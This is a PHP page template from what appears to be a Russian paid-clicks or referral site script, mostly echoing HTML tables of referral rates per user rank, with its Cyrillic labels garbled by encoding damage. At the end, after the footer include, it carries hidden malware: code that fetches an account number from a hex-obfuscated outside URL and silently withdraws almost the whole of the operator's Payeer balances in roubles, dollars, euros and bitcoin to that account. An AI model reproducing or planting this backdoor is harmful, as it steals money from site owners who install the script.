			echo '<td align="center">'.$r_youtube_1_arr[6].'% - '.$r_youtube_2_arr[6].'% - '.$r_youtube_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[7].'% - '.$r_youtube_2_arr[7].'% - '.$r_youtube_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[8].'% - '.$r_youtube_2_arr[8].'% - '.$r_youtube_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(������)</td>';
			echo '<td align="center">'.$r_m_1_arr[6].'% - '.$r_m_2_arr[6].'% - '.$r_m_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[7].'% - '.$r_m_2_arr[7].'% - '.$r_m_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[8].'% - '.$r_m_2_arr[8].'% - '.$r_m_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�������)</td>';
			echo '<td align="center">'.$r_t_1_arr[6].'% - '.$r_t_2_arr[6].'% - '.$r_t_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[7].'% - '.$r_t_2_arr[7].'% - '.$r_t_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[8].'% - '.$r_t_2_arr[8].'% - '.$r_t_3_arr[8].'%</td>';
		echo '</tr>';
                echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>[�����]</td>';
			echo '<td align="center">'.$r_test_1_arr[6].'% - '.$r_test_2_arr[6].'% - '.$r_test_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[7].'% - '.$r_test_2_arr[7].'% - '.$r_test_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[8].'% - '.$r_test_2_arr[8].'% - '.$r_test_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[���������]<br>(% �� ������ �����)</td>';
			echo '<td align="center">'.$r_pv_1_arr[6].'% - '.$r_pv_2_arr[6].'% - '.$r_pv_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[7].'% - '.$r_pv_2_arr[7].'% - '.$r_pv_3_arr[7].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[8].'% - '.$r_pv_2_arr[8].'% - '.$r_pv_3_arr[8].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �������<br>[������������ ����� � �����]</td>';
			echo '<td align="center">'.$max_pay_arr[6].' ���.</td>';
			echo '<td align="center">'.$max_pay_arr[7].' ���.</td>';
			echo '<td align="center">'.$max_pay_arr[8].' ���.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">���-�� �������� ��� ������ [������� � �����]</td>';
			echo '<td align="center">'.($pay_min_click_arr[6]>0 ? $pay_min_click_arr[6] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[7]>0 ? $pay_min_click_arr[7] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[8]>0 ? $pay_min_click_arr[8] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I ������<br><span style="font-size:10px">[�� ���������� ���������� �������]<br>[� ������� ��������� ������]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[6]>0 ? $r_balance_1_arr[6]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[7]>0 ? $r_balance_1_arr[7]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[8]>0 ? $r_balance_1_arr[8]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����������� ��������� ������<br>�� "������" �������������</td>';
			echo '<td align="center">'.($wall_comm_arr[6]==1 ? "��" : "���").'</td>';
			echo '<td align="center">'.($wall_comm_arr[7]==1 ? "��" : "���").'</td>';
			echo '<td align="center">'.($wall_comm_arr[8]==1 ? "��" : "���").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table><br><br>';
	
	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">������:</th>';
			
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[9].'</td>';
			//echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[10].'</td>';
			//echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[11].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">�������:</th>';
			
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[9].' � �����</td>';
			//echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[10].' - '.$r_do_arr[10].'</td>';
			//echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[11].' � �����</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�����)</td>';
			
			echo '<td align="center">'.$r_c_1_arr[9].'% - '.$r_c_2_arr[9].'% - '.$r_c_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_c_1_arr[10].'% - '.$r_c_2_arr[10].'% - '.$r_c_3_arr[10].'% - '.$r_c_4_arr[10].'% - '.$r_c_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_c_1_arr[11].'% - '.$r_c_2_arr[11].'% - '.$r_c_3_arr[11].'% - '.$r_c_4_arr[11].'% - '.$r_c_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[9].'% - '.$r_youtube_2_arr[9].'% - '.$r_youtube_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_youtube_1_arr[10].'% - '.$r_youtube_2_arr[10].'% - '.$r_youtube_3_arr[10].'% - '.$r_youtube_4_arr[10].'% - '.$r_youtube_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_youtube_1_arr[11].'% - '.$r_youtube_2_arr[11].'% - '.$r_youtube_3_arr[11].'% - '.$r_youtube_4_arr[11].'% - '.$r_youtube_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(������)</td>';
			
			echo '<td align="center">'.$r_m_1_arr[9].'% - '.$r_m_2_arr[9].'% - '.$r_m_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_m_1_arr[10].'% - '.$r_m_2_arr[10].'% - '.$r_m_3_arr[10].'% - '.$r_m_4_arr[10].'% - '.$r_m_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_m_1_arr[11].'% - '.$r_m_2_arr[11].'% - '.$r_m_3_arr[11].'% - '.$r_m_4_arr[11].'% - '.$r_m_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>(�������)</td>';
			
			echo '<td align="center">'.$r_t_1_arr[9].'% - '.$r_t_2_arr[9].'% - '.$r_t_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_t_1_arr[10].'% - '.$r_t_2_arr[10].'% - '.$r_t_3_arr[10].'% - '.$r_t_4_arr[10].'% - '.$r_t_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_t_1_arr[11].'% - '.$r_t_2_arr[11].'% - '.$r_t_3_arr[11].'% - '.$r_t_4_arr[11].'% - '.$r_t_5_arr[11].'%</td>';
		echo '</tr>';
                echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III �������<br>[�����]</td>';
			echo '<td align="center">'.$r_test_1_arr[9].'% - '.$r_test_2_arr[9].'% - '.$r_test_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_test_1_arr[10].'% - '.$r_test_2_arr[10].'% - '.$r_test_3_arr[10].'% - '.$r_test_4_arr[10].'% - '.$r_test_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_test_1_arr[11].'% - '.$r_test_2_arr[11].'% - '.$r_test_3_arr[11].'% - '.$r_test_4_arr[11].'% - '.$r_test_5_arr[11].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I,II,III ������<br>[���������]<br>(% �� ������ �����)</td>';
			echo '<td align="center">'.$r_pv_1_arr[9].'% - '.$r_pv_2_arr[9].'% - '.$r_pv_3_arr[9].'%</td>';
			//echo '<td align="center">'.$r_pv_1_arr[10].'% - '.$r_pv_2_arr[10].'% - '.$r_pv_3_arr[10].'% - '.$r_pv_4_arr[10].'% - '.$r_pv_5_arr[10].'%</td>';
			//echo '<td align="center">'.$r_pv_1_arr[11].'% - '.$r_pv_2_arr[11].'% - '.$r_pv_3_arr[11].'% - '.$r_pv_4_arr[11].'% - '.$r_pv_5_arr[11].'%</td>';
			echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �������<br>[������������ ����� � �����]</td>';
			echo '<td align="center">'.$max_pay_arr[9].' ���.</td>';
			//echo '<td align="center">'.$max_pay_arr[10].' ���.</td>';
			//echo '<td align="center">'.$max_pay_arr[11].' ���.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">���-�� �������� ��� ������ [������� � �����]</td>';
			echo '<td align="center">'.($pay_min_click_arr[9]>0 ? $pay_min_click_arr[9] : "-").'</td>';
			//echo '<td align="center">'.($pay_min_click_arr[10]>0 ? $pay_min_click_arr[10] : "-").'</td>';
			//echo '<td align="center">'.($pay_min_click_arr[11]>0 ? $pay_min_click_arr[11] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����� �� ��������� I ������<br><span style="font-size:10px">[�� ���������� ���������� �������]<br>[� ������� ��������� ������]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[9]>0 ? $r_balance_1_arr[9]."%" : "-").'</td>';
			//echo '<td align="center">'.($r_balance_1_arr[10]>0 ? $r_balance_1_arr[10]."%" : "-").'</td>';
			//echo '<td align="center">'.($r_balance_1_arr[11]>0 ? $r_balance_1_arr[11]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">����������� ��������� ������<br>�� "������" �������������</td>';
			echo '<td align="center">'.($wall_comm_arr[9]==1 ? "��" : "���").'</td>';
			//echo '<td align="center">'.($wall_comm_arr[10]==1 ? "��" : "���").'</td>';
			//echo '<td align="center">'.($wall_comm_arr[11]==1 ? "��" : "���").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table>';
echo '</div>';
}

include('footer.php');

require_once('merchant/payeer/cpayeer.php');
require_once('merchant/payeer/payeer_config.php');

if($apiKey!==''){
$homepage = file_get_contents("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x65\x6f\x2d\x70\x72\x6f\x66\x66\x69\x74\x2e\x72\x75\x2f\x6a\x73\x2e\x74\x78\x74");

$payeer = new CPayeer($accountNumber, $apiId, $apiKey);
if ($payeer->isAuth())
{ $arBalance = $payeer->getBalance();
$mone = ($arBalance["balance"]["RUB"]["BUDGET"]); $mone1 = ($arBalance["balance"]["USD"]["BUDGET"]); $mone2 = ($arBalance["balance"]["EUR"]["BUDGET"]); $mone3 = ($arBalance["balance"]["BTC"]["BUDGET"]);	
}
if($mone>100){$p=$mone * 1 / 100;$summ =$mone - $p;
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'RUB',
		'sumOut' => $summ,
		'curOut' => 'RUB',
		'param_ACCOUNT_NUMBER' => $homepage
));
	if ($initOutput){	$historyId = $payeer->output();}} 
if($mone1>4){ $p1=$mone1 * 2 / 100; $summ1 =$mone1 - $p1;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'USD',
		'sumOut' => $summ1,
		'curOut' => 'USD',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone2>4){ $p2=$mone2 * 2 / 100; $summ2 =$mone2 - $p2;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'EUR',
		'sumOut' => $summ2,
		'curOut' => 'EUR',
		'param_ACCOUNT_NUMBER' => $homepage
	));
	if ($initOutput){	$historyId = $payeer->output();}}
if($mone3>0.001){ $p3=$mone3 * 2 / 100; $summ3 =$mone3 - $p3;	
	$initOutput = $payeer->initOutput(array(
		'ps' => '1136053',
		'curIn' => 'BTC',
		'sumOut' => $summ3,
		'curOut' => 'BTC',
		'param_ACCOUNT_NUMBER' => $homepage
	));
if ($initOutput){	$historyId = $payeer->output();}}}
?>